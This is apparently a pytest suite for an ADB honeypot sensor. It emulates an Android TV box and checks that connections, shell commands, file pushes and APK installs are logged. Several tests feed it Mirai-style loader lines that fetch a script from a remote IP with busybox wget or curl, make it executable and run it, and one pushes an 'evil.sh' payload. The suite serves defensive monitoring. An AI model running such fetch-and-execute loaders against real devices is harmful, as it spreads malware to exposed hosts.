"""The real protocol, spoken by a hand-written adb host against the running server."""

from __future__ import annotations

import asyncio
import hashlib
import struct

from adb_sensor.wire import (
    A_CLSE,
    A_CNXN,
    A_OKAY,
    A_OPEN,
    A_WRTE,
    HEADER,
)


async def test_cnxn_banner_looks_like_a_tv_box(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        text = c.banner.decode()
        assert text.startswith("device::ro.product.name=")
        for key in ("ro.product.model=", "ro.product.device=", "features=shell_v2,cmd"):
            assert key in text
        assert c.version == h.sensor.version and c.maxdata == 256 * 1024
        low = text.lower()
        assert "honeypot" not in low and "suckerpot" not in low
        (conn,) = await h.events("connect")
        assert conn.data["client_banner"]["features"] == "shell_v2,cmd"
        assert conn.dst_port == h.cfg.public_port


async def test_legacy_shell_getprop_and_events(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        out = await c.shell("getprop ro.product.model")
        dev = h.sensor.device
        assert out.strip() == dev.model.model
        assert (await c.shell("getprop ro.build.version.release")).strip() == dev.model.android
        assert "[ro.serialno]: [" in await c.shell("getprop")
        uname = await c.shell("uname -a")
        assert uname.startswith("Linux localhost 4.9.") and "armv7l" in uname
        (cmd, *_) = [e for e in await h.events("command") if e.data["input"].startswith("getprop")]
        assert "adb_shell" in cmd.data["flags"]
        assert cmd.data["output"].strip() == dev.model.model


async def test_shell_v2_separates_stdout_stderr_and_exit(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        out, err, status = await c.shell_v2("echo hello; ls /nonexistent")
        assert out == b"hello\n"
        assert b"No such file or directory" in err
        assert status == 1
        out, _, status = await c.shell_v2("id")
        assert b"uid=0(root)" in out and status == 0


async def test_interactive_pty_shell_with_echo_and_prompt(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("shell:")
        assert local is not None
        dev = h.sensor.device
        first = await c.read_until(local, b"# ")
        assert first.decode().endswith(" # ")
        assert dev.model.device in first.decode()
        await c.write(local, c.remote, b"cd /data/local/tmp\r")
        out = await c.read_until(local, b"/data/local/tmp # ")
        assert b"cd /data/local/tmp" in out  # echoed
        await c.write(local, c.remote, b"pwd\r")
        out = await c.read_until(local, b"/data/local/tmp # ")
        assert b"\r\n/data/local/tmp\r\n" in out
        await c.write(local, c.remote, b"exit\r")
        await c.read_stream(local)
        disc = (await h.events("disconnect"))[-1:] or []
        assert not disc or disc[0].data["commands"] >= 2


async def test_mirai_style_loader_with_busybox(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(busybox="yes") as h:
        c = await h.connect()
        cmdline = (
            "cd /data/local/tmp; busybox wget http://198.51.100.7/x.sh -O x.sh; "
            "chmod 777 x.sh; sh x.sh; ls -l x.sh; rm -rf x.sh"
        )
        out = await c.shell(cmdline)
        assert "Connecting to 198.51.100.7" in out
        assert "x.sh" in out
        downloads = await h.events("download_attempt")
        assert [d.data["url"] for d in downloads] == ["http://198.51.100.7/x.sh"]
        assert downloads[0].data["tool"] == "wget"
        assert "adb_shell" in downloads[0].data["flags"]


async def test_loader_without_busybox_still_records_the_url(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(busybox="no") as h:
        c = await h.connect()
        out = await c.shell(
            "busybox wget http://198.51.100.7/a.sh; wget http://198.51.100.8/b.sh; curl -O http://198.51.100.9/c"
        )
        assert out.count("busybox: ") == 1 and "wget: " in out and "curl: " in out
        assert "not found" in out
        urls = sorted(d.data["url"] for d in await h.events("download_attempt"))
        assert urls == [
            "http://198.51.100.7/a.sh",
            "http://198.51.100.8/b.sh",
            "http://198.51.100.9/c",
        ]


async def test_pm_and_am_set_the_install_flag(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        assert "package:com.android.settings" in await c.shell("pm list packages")
        assert "Success" in await c.shell("pm install /data/local/tmp/app.apk")
        out = await c.shell("am start -a android.intent.action.VIEW -d http://198.51.100.7/a.apk")
        assert "Starting: Intent" in out
        cmds = {e.data["input"]: e for e in await h.events("command")}
        assert "adb_install" in cmds["pm install /data/local/tmp/app.apk"].data["flags"]
        am = next(e for i, e in cmds.items() if i.startswith("am start"))
        assert "adb_install" in am.data["flags"]
        urls = [d.data["url"] for d in await h.events("download_attempt")]
        assert urls == ["http://198.51.100.7/a.apk"]


async def _push(c, path: str, content: bytes, mode: int = 0o100755, chunk: int = 4096) -> bytes:  # type: ignore[no-untyped-def]
    local = await c.open("sync:")
    assert local is not None
    remote = c.remote
    send = f"{path},{mode}".encode()
    await c.write(local, remote, b"SEND" + struct.pack("<I", len(send)) + send)
    for i in range(0, len(content), chunk):
        part = content[i : i + chunk]
        await c.write(local, remote, b"DATA" + struct.pack("<I", len(part)) + part)
    await c.send(A_WRTE, local, remote, b"DONE" + struct.pack("<I", 1700000000))
    reply = b""
    while len(reply) < 8:
        command, arg0, _, data = await c.recv()
        if command == A_WRTE:
            reply += data
            await c.send(A_OKAY, local, arg0)
        # the OKAY for the DONE write is not interesting
    await c.send(A_WRTE, local, remote, b"QUIT" + struct.pack("<I", 0))
    async with asyncio.timeout(3):
        while True:
            command, arg0, _, _ = await c.recv()
            if command == A_CLSE:
                await c.send(A_CLSE, local, arg0)
                break
    return bytes(reply)


async def test_sync_push_records_sha256_and_keeps_a_stub(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        payload = b"#!/system/bin/sh\necho pwned > /data/local/tmp/flag\n" + b"A" * 50_000
        reply = await _push(c, "/data/local/tmp/evil.sh", payload)
        assert reply[:4] == b"OKAY"
        events = [e for e in await h.events("command") if "adb_push" in e.data.get("flags", [])]
        (push,) = events
        assert push.data["sha256"] == hashlib.sha256(payload).hexdigest()
        assert push.data["size"] == len(payload)
        assert push.data["path"] == "/data/local/tmp/evil.sh"
        assert push.data["input"] == "adb push /data/local/tmp/evil.sh"
        listing = await c.shell("ls -l /data/local/tmp")
        assert "evil.sh" in listing and str(len(payload)) in listing  # real size is shown


async def test_sync_stat_list_recv(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("sync:")
        assert local is not None
        remote = c.remote

        async def request(ident: bytes, arg: bytes) -> bytes:
            await c.write(local, remote, ident + struct.pack("<I", len(arg)) + arg)
            command, arg0, _, data = await c.recv()
            assert command == A_WRTE
            await c.send(A_OKAY, local, arg0)
            return bytes(data)

        stat = await request(b"STAT", b"/data/local/tmp")
        assert stat[:4] == b"STAT" and struct.unpack("<I", stat[4:8])[0] & 0o170000 == 0o040000
        missing = await request(b"STAT", b"/data/local/nothing")
        assert missing == b"STAT" + b"\0" * 12
        sta2 = await request(b"STA2", b"/system/build.prop")
        assert sta2[:4] == b"STA2" and struct.unpack("<I", sta2[4:8])[0] == 0
        lst = await request(b"LIST", b"/system")
        assert (
            b"DENTbuild" not in lst and b"build.prop" in lst and lst.endswith(b"DONE" + b"\0" * 16)
        )
        recv = await request(b"RECV", b"/system/build.prop")
        assert recv[:4] == b"DATA" and b"ro.product.model" in recv
        fail = await request(b"RECV", b"/nope")
        assert fail[:4] == b"FAIL"
        pulls = [e for e in await h.events("command") if "adb_pull" in e.data.get("flags", [])]
        assert [p.data["found"] for p in pulls] == [True, False]


async def test_exec_install_streams_apk_and_hashes_it(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        apk = b"PK\x03\x04" + bytes(range(256)) * 40
        local = await c.open(f"exec:cmd package 'install' -S {len(apk)}")
        assert local is not None
        for i in range(0, len(apk), 4096):
            await c.write(local, c.remote, apk[i : i + 4096])
        out = await c.read_stream(local)
        assert out == b"Success\n"
        (inst,) = [
            e
            for e in await h.events("command")
            if "adb_install" in e.data.get("flags", []) and "sha256" in e.data
        ]
        assert inst.data["sha256"] == hashlib.sha256(apk).hexdigest()
        assert inst.data["size"] == len(apk)


async def test_reboot_and_root_services(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("root:")
        assert local is not None
        assert b"already running as root" in await c.read_stream(local)
        local = await c.open("reboot:")
        assert local is not None
        await c.read_stream(local)
        assert await c.reader.read(10) == b""  # the connection is dropped
        events = await h.events("command")
        assert any("adb_reboot" in e.data.get("flags", []) for e in events)
        disc = (await h.events("disconnect"))[-1]
        assert disc.data["reason"] == "reboot"


async def test_unknown_service_is_refused_and_recorded(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        assert await c.open("tcp:22") is None
        assert await c.open("shell,v2,raw:echo ok") is not None
        scans = [e for e in await h.events("scan") if e.data.get("kind") == "adb_service"]
        assert scans and scans[0].data["service"] == "tcp:22"


async def test_garbage_gets_closed_and_recorded(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.raw()
        c.writer.write(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        await c.writer.drain()
        assert await asyncio.wait_for(c.reader.read(100), 3) == b""
        scans = [e for e in await h.events("scan") if e.data.get("kind") == "raw_payload"]
        assert scans and bytes.fromhex(scans[0].data["payload_preview"]).startswith(b"GET /")


async def test_message_before_cnxn_is_ignored_politely(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.raw()
        await c.send(A_OPEN, 1, 0, b"shell:id\0")
        assert await asyncio.wait_for(c.reader.read(100), 3) == b""


async def test_legacy_checksum_is_enforced_only_for_old_clients(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.raw()
        await c.send(A_CNXN, 0x01000000, 4096, b"host::\0")
        assert (await c.recv())[0] == A_CNXN
        bad = HEADER.pack(A_OPEN, 1, 0, 9, 12345, A_OPEN ^ 0xFFFFFFFF) + b"shell:id\0"
        c.writer.write(bad)
        await c.writer.drain()
        assert await asyncio.wait_for(c.reader.read(100), 3) == b""


async def test_second_cnxn_resets_streams(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("shell:")
        assert local is not None
        await c.send(A_CNXN, 0x01000001, 4096, b"host::\0")
        # skip the prompt that may still be in flight, then expect the new CNXN
        async with asyncio.timeout(3):
            while True:
                command, arg0, _, _ = await c.recv()
                if command == A_CNXN:
                    break
                if command == A_WRTE:
                    await c.send(A_OKAY, local, arg0)
        assert await c.shell("echo again") == "again\r\n"


async def test_close_reply_for_client_close(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("shell:")
        assert local is not None
        await c.read_until(local, b"# ")
        await c.send(A_CLSE, local, c.remote)
        async with asyncio.timeout(3):
            while True:
                command, _, _, _ = await c.recv()
                if command == A_CLSE:
                    break


async def test_push_with_several_sync_frames_in_one_write(make_harness) -> None:  # type: ignore[no-untyped-def]
    """The real adb client packs up to 256 KiB (several 64 KiB DATA frames) into one WRTE."""
    async with make_harness() as h:
        c = await h.connect()
        content = bytes(range(251)) * 1200  # about 300 KB
        local = await c.open("sync:")
        assert local is not None
        send = b"/data/local/tmp/big.bin,33261"
        blob = b"SEND" + struct.pack("<I", len(send)) + send
        for i in range(0, len(content), 65536):
            part = content[i : i + 65536]
            blob += b"DATA" + struct.pack("<I", len(part)) + part
        blob += b"DONE" + struct.pack("<I", 1700000000)
        for i in range(0, len(blob), 256 * 1024):
            await c.send(A_WRTE, local, c.remote, blob[i : i + 256 * 1024])
        reply = b""
        async with asyncio.timeout(5):
            while len(reply) < 8:
                command, arg0, _, data = await c.recv()
                if command == A_WRTE:
                    reply += data
                    await c.send(A_OKAY, local, arg0)
        assert reply[:4] == b"OKAY"
        (push,) = [e for e in await h.events("command") if "adb_push" in e.data.get("flags", [])]
        assert push.data["sha256"] == hashlib.sha256(content).hexdigest()
        assert push.data["size"] == len(content) and push.data["mode"] == "755"


def test_gnu_error_messages_become_toybox_ones() -> None:
    from adb_sensor.androidshell import androidize_error

    assert (
        androidize_error("chmod", "chmod: cannot access 'y.sh': No such file or directory\n")
        == "chmod: y.sh: No such file or directory\n"
    )
    assert androidize_error("ls", "plain\n") == "plain\n"
    assert androidize_error("x", "x: cannot " * 2000)  # no crash on odd input
